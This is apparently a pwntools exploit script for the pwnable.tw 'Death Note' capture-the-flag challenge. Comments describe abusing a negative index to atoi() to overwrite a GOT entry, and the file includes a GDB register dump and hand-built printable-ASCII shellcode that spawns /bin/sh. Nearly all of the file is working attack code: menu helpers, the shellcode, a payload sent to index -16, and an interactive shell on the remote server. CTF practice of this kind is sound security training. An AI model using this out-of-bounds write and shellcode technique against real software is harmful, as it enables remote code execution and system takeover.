from pwn import *

## !!!!!!!!!!!!! local environ only stack nas rwx but remote has rwx at heap
## input a negative number to atoi() will cause oob, and note address is at .bss section
## so we can overwrite got table with heap address using add function to call shellcode

#r = process("./D", env={"LD_PRELOAD" : "./libc_32.so.6"})
r = remote('chall.pwnable.tw',10201)
context.arch='i386'

def add(idx,name):
    r.sendafter(b'Your choice :',b'1')
    r.sendafter(b'Index :',str(idx))
    r.sendafter(b'Name :',name)

def delete(idx):
    r.sendafter(b'Your choice :',b'3')
    r.sendafter(b'Index :',str(idx))

def show(idx,length):
    r.sendafter(b'Your choice :',b'2')  
    r.sendafter(b'Index :',str(idx))
    r.recvuntil(b'Name : ')
    return r.recv(length)
### layout before shellcode execute

# $eax   : 0xfffffff0
# $ebx   : 0x0
# $ecx   : 0x0
# $edx   : 0x96dc008  →  0x00000000
# $esp   : 0xfffa41bc  →  0x80487f4  →  <add_note+165> add esp, 0x10
# $ebp   : 0xfffa4238  →  0xfffa4248  →  0x00000000
# $esi   : 0xf7f34000  →  0x001afdb0
# $edi   : 0xf7f34000  →  0x001afdb0
# $eip   : 0x96dc008  →  0x00000000
# $eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
# $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
# ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
# 0xfffa41bc│+0x0000: 0x80487f4  →  <add_note+165> add esp, 0x10   ← $esp
# 0xfffa41c0│+0x0004: 0x8048ada  →  "Done !"
# 0xfffa41c4│+0x0008: 0x000050 ("P"?)
# 0xfffa41c8│+0x000c: 0xfffa4238  →  0xfffa4248  →  0x00000000
# 0xfffa41cc│+0x0010: 0x8048775  →  <add_note+38> mov DWORD PTR [ebp-0x60], eax
# 0xfffa41d0│+0x0014: 0xf7f4d7eb  →   add esi, 0x14815
# 0xfffa41d4│+0x0018: 0x00000000
# 0xfffa41d8│+0x001c: 0xfffffff0


## ref 1 : https://nets.ec/Ascii_shellcode
## ref 2 : http://p4nda.top/2017/09/29/pwnable-tw-deathnote/ 

shellcode = '''
    /* edx = shellcode head*/ 
    push 0x68
    push 0x732f2f2f /*213*/
    push 0x6e69622f
    push esp
    pop ebx   /*ebx = /bin/sh*/

    dec ecx
    push ecx
    pop eax    /* eax = 0xffffffff */
    inc ecx    /* ecx = 0 */
    xor ax, 0x4f65
    xor ax, 0x3057 /* eax = 0xffff80cd*/
    xor word ptr [edx+37], ax

    /* set eax to 0xb*/

    push 0x3b
    pop eax
    xor al, 0x30 

    /*set edx to 0*/
    push ecx
    pop edx 

'''
payload = asm(shellcode) + b'\x00'
print(len(payload))
add(-16,payload)


r.interactive()